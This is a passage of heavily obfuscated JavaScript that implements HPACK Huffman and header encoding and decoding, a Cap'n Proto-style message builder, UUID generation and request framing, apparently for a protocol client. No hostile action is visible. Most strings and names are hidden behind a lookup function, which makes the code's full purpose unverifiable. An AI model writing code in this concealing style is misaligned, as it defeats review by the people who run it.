        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0ar = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0as() {
    const fy = a0ch, a = {
            'OPowU': function (c, d) {
                return c < d;
            },
            'YxGrd': function (c, d) {
                return c - d;
            },
            'nKfNq': function (c, d) {
                return c >= d;
            },
            'BfRnG': function (c, d) {
                return c & d;
            },
            'CUtzC': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a['OPowU'](c, a0aq[fy(0xed)]); c++) {
        const d = a0aq[c], f = a0ar[c];
        let g = b;
        for (let h = a[fy(0xa6f)](f, 0x1); a['nKfNq'](h, 0x0); h--) {
            const i = a[fy(0x907)](d >> h, 0x1);
            g[i] === null && (g[i] = [
                null,
                null,
                -0x1,
                a[fy(0xa43)](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0at = a0as();
function a0au(a) {
    const fz = a0ch, b = {
            'qFKSK': function (h, i) {
                return h >= i;
            },
            'dBeRS': function (h, i) {
                return h >> i;
            },
            'yRewu': function (h, i) {
                return h | i;
            },
            'rihec': function (h, i) {
                return h >= i;
            },
            'cIEqe': function (h, i) {
                return h === i;
            },
            'TUSiL': fz(0x50c),
            'cYMpZ': function (h, i) {
                return h !== i;
            },
            'lezjK': function (h, i) {
                return h << i;
            },
            'nGktC': fz(0x56a)
        }, c = [];
    let d = a0at, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b['qFKSK'](i, 0x0); i--) {
            const j = b[fz(0x572)](h, i) & 0x1;
            f = b[fz(0x75a)](f << 0x1, j), g += 0x1, d = d[j];
            if (d === null)
                throw new Error('invalid\x20HPACK\x20Huffman\x20string');
            if (b[fz(0xceb)](d[0x2], 0x0)) {
                const k = fz(0x524)['split']('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        d = a0at;
                        continue;
                    case '1':
                        f = 0x0;
                        continue;
                    case '2':
                        c[fz(0x77f)](d[0x2]);
                        continue;
                    case '3':
                        if (b['cIEqe'](d[0x2], 0x100))
                            throw new Error(b[fz(0x415)]);
                        continue;
                    case '4':
                        g = 0x0;
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (g > 0x7 || b[fz(0xbe9)](f, b[fz(0xb14)](0x1, g) - 0x1))
        throw new Error(b[fz(0x214)]);
    return Buffer['from'](c);
}
function a0av(a, b, c) {
    const fA = a0ch, d = {
            'sFsyQ': function (j, k) {
                return j >= k;
            },
            'MINkN': function (j, k) {
                return j - k;
            },
            'paEvZ': function (j, k) {
                return j & k;
            },
            'bGfut': function (j, k) {
                return j < k;
            },
            'yBmGH': fA(0x30c),
            'UmqbO': function (j, k) {
                return j * k;
            },
            'RBZdC': function (j, k) {
                return j === k;
            },
            'CzQqs': function (j, k) {
                return j > k;
            },
            'dlbxp': fA(0x2dd)
        };
    if (d[fA(0x378)](b, a[fA(0xed)]))
        throw new Error(fA(0x30c));
    const f = a[b];
    b += 0x1;
    const g = d['MINkN'](0x1 << c, 0x1);
    let h = d['paEvZ'](f, g);
    if (d[fA(0xca3)](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (b >= a[fA(0xed)])
            throw new Error(d[fA(0xa42)]);
        const j = a[b];
        b += 0x1, h += d[fA(0x2f0)](j & 0x7f, Math[fA(0x584)](0x2, i));
        if (d['RBZdC'](d[fA(0xa93)](j, 0x80), 0x0))
            return [
                h,
                b
            ];
        i += 0x7;
        if (d['CzQqs'](i, 0x1c))
            throw new Error(d[fA(0x535)]);
    }
}
function a0aw(a, b) {
    const fB = a0ch, c = {
            'pPePa': function (j, k) {
                return j >= k;
            },
            'ZQGsm': fB(0x77a),
            'uejsz': function (j, k) {
                return j & k;
            },
            'AhscQ': function (j, k, l, m) {
                return j(k, l, m);
            },
            'YAcoM': function (j, k) {
                return j + k;
            },
            'kLUVT': function (j, k) {
                return j(k);
            }
        };
    if (c[fB(0x95e)](b, a[fB(0xed)]))
        throw new Error(c['ZQGsm']);
    const d = Boolean(c[fB(0xa67)](a[b], 0x80)), [f, g] = c['AhscQ'](a0av, a, b, 0x7), h = c[fB(0x900)](g, f);
    if (h > a[fB(0xed)])
        throw new Error(fB(0x455));
    const i = a[fB(0x4b4)](g, h);
    return [
        d ? c['kLUVT'](a0au, i) : i,
        h
    ];
}
class a0ax {
    constructor() {
        const fC = a0ch;
        this[fC(0x77e)] = [], this['dynamicSize'] = 0x0, this[fC(0xb8a)] = 0x1000;
    }
    [a0ch(0x6a9)](a) {
        const fD = a0ch, b = {
                'YixQz': function (d, f) {
                    return d <= f;
                },
                'FfUDq': 'invalid\x20HPACK\x20index',
                'iLqdo': function (d, f) {
                    return d - f;
                },
                'hVVMy': function (d, f) {
                    return d < f;
                },
                'oEwUO': function (d, f) {
                    return d >= f;
                },
                'fKCXM': 'HPACK\x20dynamic\x20index\x20out\x20of\x20range'
            };
        if (b[fD(0x749)](a, 0x0))
            throw new Error(b[fD(0x57b)]);
        if (b[fD(0x749)](a, a0ap[fD(0xed)]))
            return a0ap[b['iLqdo'](a, 0x1)];
        const c = a - a0ap['length'] - 0x1;
        if (b[fD(0x74c)](c, 0x0) || b[fD(0x35a)](c, this[fD(0x77e)]['length']))
            throw new Error(b['fKCXM']);
        return this[fD(0x77e)][c];
    }
    [a0ch(0x84a)](a, b) {
        const fE = a0ch, c = {
                'AZQRS': function (f, g) {
                    return f + g;
                },
                'SyLSY': fE(0xc74),
                'xGnCD': function (f, g) {
                    return f > g;
                },
                'xpMnC': function (f, g) {
                    return f > g;
                },
                'QeoLI': function (f, g) {
                    return f > g;
                },
                'ATxyE': function (f, g) {
                    return f + g;
                }
            }, d = c[fE(0x583)](c[fE(0x583)](0x20, Buffer['byteLength'](a, 'utf8')), Buffer['byteLength'](b, c[fE(0x631)]));
        if (c['xGnCD'](d, this[fE(0xb8a)])) {
            this['dynamic'] = [], this[fE(0x6ac)] = 0x0;
            return;
        }
        while (c[fE(0xaf7)](this[fE(0x77e)][fE(0xed)], 0x0) && c[fE(0x53f)](c['ATxyE'](this[fE(0x6ac)], d), this[fE(0xb8a)])) {
            const [f, g] = this[fE(0x77e)][fE(0x3ff)]();
            this['dynamicSize'] -= c[fE(0x583)](0x20 + Buffer[fE(0xd10)](f, c['SyLSY']), Buffer[fE(0xd10)](g, c[fE(0x631)]));
        }
        this[fE(0x77e)][fE(0x1ad)]([
            a,
            b
        ]), this['dynamicSize'] += d;
    }
    [a0ch(0x7be)](a) {
        const fF = a0ch, b = {
                'xRpmc': function (f, g) {
                    return f < g;
                },
                'Qedjt': function (f, g) {
                    return f & g;
                },
                'UsOqM': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'aCeja': function (f, g) {
                    return f & g;
                },
                'wfcVm': function (f, g, h) {
                    return f(g, h);
                },
                'deSoG': fF(0xc74),
                'SiKLx': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'CNEKi': 'HPACK\x20table\x20size\x20exceeds\x20limit',
                'YmXfN': function (f, g) {
                    return f > g;
                },
                'jfALu': function (f, g) {
                    return f > g;
                },
                'pNuVq': function (f, g) {
                    return f + g;
                }
            }, c = [];
        let d = 0x0;
        while (b['xRpmc'](d, a[fF(0xed)])) {
            const f = a[d];
            if (b[fF(0xa2d)](f, 0x80)) {
                let j;
                [j, d] = b['UsOqM'](a0av, a, d, 0x7), c[fF(0x77f)](this['tableEntry'](j));
                continue;
            }
            if (b[fF(0x7a9)](f, 0x40)) {
                let k, l;
                [k, d] = b[fF(0x41b)](a0av, a, d, 0x6);
                if (k)
                    l = this[fF(0x6a9)](k)[0x0];
                else {
                    let o;
                    [o, d] = b[fF(0xbfd)](a0aw, a, d), l = o[fF(0x1d9)](b[fF(0x485)])[fF(0xacd)]();
                }
                let m;
                [m, d] = a0aw(a, d);
                const n = m['toString'](b[fF(0x485)]);
                this[fF(0x84a)](l, n), c[fF(0x77f)]([
                    l,
                    n
                ]);
                continue;
            }
            if (f & 0x20) {
                let p;
                [p, d] = b[fF(0x251)](a0av, a, d, 0x5);
                if (p > 0x1000)
                    throw new Error(b[fF(0x4a2)]);
                this['maxSize'] = p;
                while (b[fF(0x9bb)](this[fF(0x77e)][fF(0xed)], 0x0) && b[fF(0xc5a)](this[fF(0x6ac)], p)) {
                    const [q, r] = this[fF(0x77e)][fF(0x3ff)]();
                    this[fF(0x6ac)] -= b['pNuVq'](0x20 + Buffer[fF(0xd10)](q, b['deSoG']), Buffer[fF(0xd10)](r, b[fF(0x485)]));
                }
                continue;
            }
            let g, h;
            [g, d] = a0av(a, d, 0x4);
            if (g)
                h = this['tableEntry'](g)[0x0];
            else {
                let s;
                [s, d] = b[fF(0xbfd)](a0aw, a, d), h = s[fF(0x1d9)](b[fF(0x485)])['toLowerCase']();
            }
            let i;
            [i, d] = a0aw(a, d), c[fF(0x77f)]([
                h,
                i['toString'](b[fF(0x485)])
            ]);
        }
        return c;
    }
}
function a0ay(a, b, c) {
    const fG = a0ch, d = {
            'zfIhh': function (h, i) {
                return h - i;
            },
            'BKuex': function (h, i) {
                return h << i;
            },
            'sqDlW': function (h, i) {
                return h < i;
            },
            'LStKj': function (h, i) {
                return h | i;
            },
            'MOQtM': function (h, i) {
                return h & i;
            },
            'yYSTO': function (h, i) {
                return h / i;
            }
        }, f = d[fG(0xa3d)](d[fG(0xaf8)](0x1, b), 0x1);
    if (d[fG(0x2ce)](a, f))
        return Buffer['from']([d[fG(0x697)](c, a)]);
    const g = [d[fG(0x697)](c, f)];
    a -= f;
    while (a >= 0x80) {
        g[fG(0x77f)](d[fG(0x697)](d[fG(0xb52)](a, 0x7f), 0x80)), a = Math[fG(0x579)](d['yYSTO'](a, 0x80));
    }
    return g['push'](a), Buffer['from'](g);
}
function a0az(a) {
    const fH = a0ch, b = {
            'PAkbM': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = Buffer[fH(0x8c2)](a, fH(0xc74));
    return Buffer[fH(0x653)]([
        b[fH(0x518)](a0ay, c[fH(0xed)], 0x7, 0x0),
        c
    ]);
}
function a0aA(a) {
    const fI = a0ch, b = {
            'BFztQ': ':status',
            'LKsnh': function (d, f) {
                return d === f;
            },
            'UWieN': fI(0x7f2),
            'iCSKm': fI(0x20a),
            'mYStr': '206',
            'oQoCt': fI(0x132),
            'Kdooe': '400',
            'Iinvi': function (d, f) {
                return d === f;
            },
            'UsXPJ': fI(0x4d5),
            'ScGXv': function (d, f, g, h) {
                return d(f, g, h);
            },
            'nxDcy': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (d === b[fI(0x4cd)] && b[fI(0x520)](f, b[fI(0xb43)]))
            c['push'](0x88);
        else {
            if (b[fI(0x520)](d, b['BFztQ']) && f === b[fI(0x957)])
                c[fI(0x77f)](0x89);
            else {
                if (b[fI(0x520)](d, b[fI(0x4cd)]) && f === b[fI(0x4d7)])
                    c[fI(0x77f)](0x8a);
                else {
                    if (d === b['BFztQ'] && f === b[fI(0x861)])
                        c[fI(0x77f)](0x8b);
                    else {
                        if (b[fI(0x520)](d, ':status') && f === b[fI(0x702)])
                            c[fI(0x77f)](0x8c);
                        else {
                            if (b['LKsnh'](d, b['BFztQ']) && b['Iinvi'](f, b[fI(0x5c0)]))
                                c[fI(0x77f)](0x8d);
                            else
                                d === b[fI(0x4cd)] && b[fI(0x520)](f, fI(0x302)) ? c[fI(0x77f)](0x8e) : (c[fI(0x77f)](...b[fI(0xc46)](a0ay, 0x0, 0x4, 0x0)), c['push'](...b[fI(0x88c)](a0az, d)), c[fI(0x77f)](...a0az(f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[fI(0x8c2)](c);
}
class a0aB {
    constructor() {
        this['words'] = [];
    }
    ['alloc'](a) {
        const fJ = a0ch, b = this['words'][fJ(0xed)];
        for (let c = 0x0; c < a; c++) {
            this[fJ(0x3db)][fJ(0x77f)](0x0n);
        }
        return b;
    }
    ['structPtr'](a, b, c, d) {
        const fK = a0ch, f = {
                'pVpvH': function (j, k) {
                    return j - k;
                },
                'WoCPI': function (j, k) {
                    return j - k;
                },
                'yXQFc': function (j, k) {
                    return j & k;
                },
                'Mkmfh': function (j, k) {
                    return j << k;
                },
                'UbZsY': function (j, k) {
                    return j(k);
                },
                'TOKSg': function (j, k) {
                    return j | k;
                },
                'XSirz': function (j, k) {
                    return j & k;
                },
                'NGupT': function (j, k) {
                    return j(k);
                }
            }, g = f[fK(0x32b)](f[fK(0x7a6)](b, a), 0x1), h = f['yXQFc'](f['Mkmfh'](f[fK(0x574)](BigInt, g), 0x2n), 0xfffffffcn), i = f[fK(0xabe)](BigInt(f[fK(0x9a0)](c, 0xffff)), f[fK(0x6e8)](BigInt, d & 0xffff) << 0x10n);
        this[fK(0x3db)][a] = h | f[fK(0x39d)](i, 0x20n);
    }
    [a0ch(0x7c4)](a, b, c) {
        const fL = a0ch, d = {
                'iDQsZ': function (g, h) {
                    return g(h);
                },
                'SHxsT': function (g, h) {
                    return g * h;
                },
                'zwLfV': function (g, h) {
                    return g & h;
                },
                'QAHCe': function (g, h) {
                    return g << h;
                },
                'NhiLP': function (g, h) {
                    return g * h;
                }
            }, f = 0xffn << d[fL(0xc64)](BigInt, d[fL(0xa73)](b, 0x8));
        this[fL(0x3db)][a] = d['zwLfV'](this[fL(0x3db)][a], ~f) | d[fL(0x70d)](d[fL(0xc64)](BigInt, c & 0xff), d[fL(0xc64)](BigInt, d[fL(0x213)](b, 0x8)));
    }
    [a0ch(0x1e8)](a, b, c) {
        const fM = a0ch, d = {
                'quDUY': function (g, h) {
                    return g << h;
                },
                'eUCUA': function (g, h) {
                    return g * h;
                },
                'qVxJN': function (g, h) {
                    return g | h;
                },
                'pmRVC': function (g, h) {
                    return g & h;
                },
                'jwRdI': function (g, h) {
                    return g(h);
                }
            }, f = d[fM(0x82e)](0xffffn, BigInt(d[fM(0xab1)](b, 0x8)));
        this[fM(0x3db)][a] = d[fM(0x562)](d[fM(0x76f)](this[fM(0x3db)][a], ~f), d[fM(0x82e)](d[fM(0x347)](BigInt, d[fM(0x76f)](c, 0xffff)), d[fM(0x347)](BigInt, d[fM(0xab1)](b, 0x8))));
    }
    [a0ch(0xa9a)](a, b, c) {
        const fN = a0ch, d = {
                'txvhM': function (g, h) {
                    return g(h);
                },
                'xnalj': function (g, h) {
                    return g * h;
                },
                'MuVsw': function (g, h) {
                    return g | h;
                },
                'CFiql': function (g, h) {
                    return g << h;
                },
                'IlRXq': function (g, h) {
                    return g(h);
                },
                'CvDHP': function (g, h) {
                    return g & h;
                },
                'pqAXn': function (g, h) {
                    return g(h);
                },
                'jnTGx': function (g, h) {
                    return g * h;
                }
            }, f = 0xffffffffn << d[fN(0x12b)](BigInt, d['xnalj'](b, 0x8));
        this[fN(0x3db)][a] = d[fN(0x352)](this[fN(0x3db)][a] & ~f, d[fN(0xa46)](d[fN(0xef)](BigInt, d[fN(0xb04)](c, 0xffffffff)), d[fN(0x138)](BigInt, d[fN(0x8ba)](b, 0x8))));
    }
    [a0ch(0x707)](a, b) {
        const fO = a0ch, c = {
                'FsQrN': function (d, f) {
                    return d & f;
                },
                'WuKzj': function (d, f) {
                    return d(f);
                }
            };
        this[fO(0x3db)][a] = c['FsQrN'](c[fO(0xaa9)](BigInt, b), 0xffffffffffffffffn);
    }
    ['writeBytes'](a, b, c = ![]) {
        const fP = a0ch, d = {
                'wFxqt': fP(0x9be),
                'bIfnM': function (m, n) {
                    return m + n;
                },
                'JHPkB': function (m, n) {
                    return m < n;
                },
                'pKncO': function (m, n) {
                    return m + n;
                },
                'WznzJ': function (m, n) {
                    return m / n;
                },
                'vASnN': function (m, n) {
                    return m % n;
                },
                'ZFhLz': function (m, n) {
                    return m - n;
                },
                'wpcpn': function (m, n) {
                    return m - n;
                },
                'OeAWY': function (m, n) {
                    return m | n;
                },
                'cvLwZ': function (m, n) {
                    return m << n;
                },
                'yXwqf': function (m, n) {
                    return m(n);
                },
                'sLIiw': function (m, n) {
                    return m(n);
                },
                'sosFi': function (m, n) {
                    return m & n;
                },
                'VaZVa': function (m, n) {
                    return m | n;
                }
            }, f = typeof b === d[fP(0x7ca)] ? Buffer[fP(0x8c2)](b, fP(0xc74)) : b, g = d['bIfnM'](f[fP(0xed)], c ? 0x1 : 0x0), h = this['alloc'](Math[fP(0x3cd)](g / 0x8));
        for (let m = 0x0; d[fP(0x4e4)](m, f[fP(0xed)]); m++) {
            this[fP(0x7c4)](d['pKncO'](h, Math[fP(0x579)](d['WznzJ'](m, 0x8))), d[fP(0x9f6)](m, 0x8), f[m]);
        }
        const j = d[fP(0x87c)](d[fP(0x98c)](h, a), 0x1), k = d[fP(0xc3b)](d[fP(0xd09)](d[fP(0x160)](BigInt, j), 0x2n), 0x1n) & 0xffffffffn, l = d[fP(0xc3b)](0x2n, d['sLIiw'](BigInt, d['sosFi'](g, 0x1fffffff)) << 0x3n);
        this[fP(0x3db)][a] = d[fP(0x98e)](k, l << 0x20n);
    }
    [a0ch(0x1b3)](a, b) {
        const fQ = a0ch, c = {
                'luNCC': function (g, h) {
                    return g - h;
                },
                'njPqY': function (g, h) {
                    return g & h;
                },
                'rgPqP': function (g, h) {
                    return g | h;
                },
                'SaWiT': function (g, h) {
                    return g << h;
                },
                'ATNKr': function (g, h) {
                    return g(h);
                },
                'NJHZL': function (g, h) {
                    return g << h;
                },
                'HILAL': function (g, h) {
                    return g(h);
                },
                'SaLve': function (g, h) {
                    return g + h;
                }
            };
        if (!b['length']) {
            this[fQ(0x3db)][a] = 0x0n;
            return;
        }
        const d = this['alloc'](b[fQ(0xed)]), f = c[fQ(0x591)](d - a, 0x1);
        this[fQ(0x3db)][a] = c[fQ(0xcaa)](c[fQ(0xbad)](c['SaWiT'](c[fQ(0x81e)](BigInt, f), 0x2n), 0x1n), 0xffffffffn) | c[fQ(0x870)](c['rgPqP'](0x6n, c[fQ(0xc16)](c[fQ(0xbf7)](BigInt, b[fQ(0xed)]), 0x3n)), 0x20n);
        for (let g = 0x0; g < b[fQ(0xed)]; g++) {
            this[fQ(0xd50)](c[fQ(0x24c)](d, g), b[g], !![]);
        }
    }
    [a0ch(0x527)](a, b, c, d, f) {
        const fR = a0ch, g = {
                'UNJrm': function (m, n) {
                    return m + n;
                },
                'AAilY': function (m, n) {
                    return m - n;
                },
                'Wgbue': function (m, n) {
                    return m & n;
                },
                'oWwAw': function (m, n) {
                    return m | n;
                },
                'fXfcX': function (m, n) {
                    return m << n;
                },
                'OLwAt': function (m, n) {
                    return m(n);
                },
                'GSZMe': function (m, n) {
                    return m << n;
                },
                'xphoC': function (m, n) {
                    return m | n;
                },
                'cIhVA': function (m, n) {
                    return m << n;
                },
                'UPbqS': function (m, n) {
                    return m * n;
                },
                'iogvc': function (m, n) {
                    return m | n;
                },
                'oJTuZ': function (m, n) {
                    return m(n);
                },
                'wGdNb': function (m, n, o) {
                    return m(n, o);
                }
            }, h = this[fR(0x9e7)](0x1), j = g[fR(0xb5c)](c, d), k = this[fR(0x9e7)](b * j), l = g['AAilY'](g[fR(0xbf1)](h, a), 0x1);
        this['words'][a] = g['Wgbue'](g[fR(0x3e0)](g[fR(0x291)](g[fR(0x6d7)](BigInt, l), 0x2n), 0x1n), 0xffffffffn) | g[fR(0x439)](g[fR(0x69f)](g[fR(0xc3d)](g[fR(0x39f)](g[fR(0x6d7)](BigInt, b), g[fR(0x6d7)](BigInt, j)), 0x3n), 0x7n), 0x20n), this[fR(0x3db)][h] = g[fR(0x913)](g['iogvc'](g[fR(0x291)](BigInt(b), 0x2n), g[fR(0xc3d)](g[fR(0x6d7)](BigInt, c), 0x20n)), g[fR(0x8a1)](BigInt, d) << 0x30n);
        for (let m = 0x0; m < b; m++) {
            g[fR(0x483)](f, m, k + g['UPbqS'](m, j));
        }
    }
    ['finish']() {
        const fS = a0ch, a = {
                'aEpPC': function (d, f) {
                    return d * f;
                },
                'nZtbe': function (d, f) {
                    return d < f;
                },
                'VReYc': function (d, f) {
                    return d & f;
                }
            }, b = Buffer[fS(0x9e7)](0x8);
        b[fS(0x3f9)](0x0, 0x0), b['writeUInt32LE'](this[fS(0x3db)][fS(0xed)], 0x4);
        const c = Buffer[fS(0x9e7)](a['aEpPC'](this[fS(0x3db)]['length'], 0x8));
        for (let d = 0x0; a[fS(0x5b0)](d, this['words'][fS(0xed)]); d++) {
            c['writeBigUInt64LE'](a[fS(0x31e)](this[fS(0x3db)][d], 0xffffffffffffffffn), a[fS(0x7dd)](d, 0x8));
        }
        return Buffer['concat']([
            b,
            c
        ]);
    }
}
function a0aC(a) {
    const fT = a0ch, b = new a0aB(), c = b[fT(0x9e7)](0x1), d = b[fT(0x9e7)](0x1), f = b[fT(0x9e7)](0x1);
    b[fT(0x943)](c, d, 0x1, 0x1), b[fT(0x1e8)](d, 0x0, 0x8);
    const g = b['alloc'](0x1);
    return b['alloc'](0x1), b[fT(0x943)](f, g, 0x1, 0x1), b['setU32'](g, 0x0, a), b[fT(0xb9b)]();
}
function a0aD(a, b, c, d, f, g) {
    const fU = a0ch, h = {
            'VWpmf': function (H, I) {
                return H & I;
            },
            'grzXk': function (H, I) {
                return H | I;
            },
            'Tbrxa': fU(0x9a1),
            'AbeTS': 'Nexus-Python'
        }, i = new a0aB(), j = i[fU(0x9e7)](0x1), k = i[fU(0x9e7)](0x1), l = i[fU(0x9e7)](0x1);
    i[fU(0x943)](j, k, 0x1, 0x1), i['setU16'](k, 0x0, 0x2);
    const m = i[fU(0x9e7)](0x1), n = i[fU(0x9e7)](0x1);
    i[fU(0x9e7)](0x1);
    const o = i[fU(0x9e7)](0x1), p = i[fU(0x9e7)](0x1);
    i[fU(0x9e7)](0x1), i[fU(0x943)](l, m, 0x3, 0x3), i[fU(0xa9a)](m, 0x0, a), i[fU(0x707)](n, 0xf71695ec7fe85497n);
    const q = i[fU(0x9e7)](0x1), r = i[fU(0x9e7)](0x1);
    i[fU(0x943)](o, q, 0x1, 0x1), i[fU(0x1e8)](q, 0x4, 0x1);
    const s = i['alloc'](0x1);
    i['alloc'](0x1), i[fU(0x943)](r, s, 0x1, 0x1), i['setU32'](s, 0x0, b);
    const t = i[fU(0x9e7)](0x1);
    i['alloc'](0x1), i['structPtr'](p, t, 0x0, 0x2);
    const u = i[fU(0x9e7)](0x1), v = i[fU(0x9e7)](0x1), w = i['alloc'](0x1), x = i[fU(0x9e7)](0x1);
    i[fU(0x943)](t, u, 0x1, 0x3), i['setU8'](u, 0x0, g);
    const y = i[fU(0x9e7)](0x1), z = i[fU(0x9e7)](0x1);
    i[fU(0x943)](v, y, 0x0, 0x2), i[fU(0xd50)](y, c, !![]), i[fU(0xd50)](z, d), i[fU(0xd50)](w, f);
    const A = i['alloc'](0x1), B = i[fU(0x9e7)](0x1);
    i['alloc'](0x1), i[fU(0x943)](x, A, 0x1, 0x2);
    const C = i[fU(0x9e7)](0x1), D = i[fU(0x9e7)](0x1), E = i[fU(0x9e7)](0x1), F = i['alloc'](0x1);
    i[fU(0x943)](B, C, 0x0, 0x4);
    const G = a0k[fU(0x863)](0x10);
    return G[0x6] = h[fU(0x77d)](G[0x6], 0xf) | 0x40, G[0x8] = h[fU(0x54a)](h[fU(0x77d)](G[0x8], 0x3f), 0x80), i[fU(0xd50)](C, G), i[fU(0x1b3)](D, [
        fU(0xc90),
        h['Tbrxa']
    ]), i[fU(0xd50)](E, fU(0xd0d), !![]), i[fU(0xd50)](F, h[fU(0x4cf)], !![]), i[fU(0xb9b)]();
}
function a0aE(a) {
    const fV = a0ch, b = {
            'mFLsV': function (f, g) {
                return f - g;
            },
            'pJyYO': function (f, g) {
                return f + g;
            },
            'bYpJI': function (f, g) {
                return f + g;
            },
            'WPGoA': function (f, g) {
                return f * g;
            },
            'Aqaoo': function (f, g) {
                return f % g;
            },
            'ixIkJ': function (f, g) {
                return f < g;
            },
            'VsKMb': function (f, g) {
                return f + g;
            },
            'JZyDu': function (f, g) {
                return f + g;
            },
            'WStuO': function (f, g) {
                return f * g;
            },
            'ZvxPp': function (f, g) {
                return f < g;
            },
            'RlBBs': function (f, g) {
                return f !== g;
            },
            'FncGb': fV(0xbf9)
        }, c = [];
    let d = 0x0;
    while (b[fV(0xb54)](a[fV(0xed)], d) >= 0x8) {
        const f = a[fV(0xc38)](d), g = a[fV(0xc38)](b[fV(0xcba)](d, 0x4)), h = f + 0x1;
        let j = b[fV(0xb19)](h, 0x1), k = b[fV(0x83c)](j, 0x4);
        b[fV(0x274)](k, 0x8) && (k += 0x4);
        if (b[fV(0xb54)](a[fV(0xed)], d) < k)
            break;
        const l = [g];
        for (let n = 0x1; b[fV(0x482)](n, h); n++) {
            l[fV(0x77f)](a[fV(0xc38)](b[fV(0xb19)](b[fV(0x797)](d, 0x4), b['WPGoA'](n, 0x4))));
        }
        const m = b[fV(0xc62)](k, b[fV(0xba2)](l['reduce']((o, p) => o + p, 0x0), 0x8));
        if (b[fV(0x2bc)](b[fV(0xb54)](a[fV(0xed)], d), m))
            break;
        if (b['RlBBs'](h, 0x1))
            throw new Error(b[fV(0xa1b)]);
        c['push'](a[fV(0x4b4)](d + k, b[fV(0xb19)](d, m))), d += m;
    }
    return [
        c,
        a[fV(0x4b4)](d)
    ];
}
function a0aF(a, b) {
    const fW = a0ch, c = {
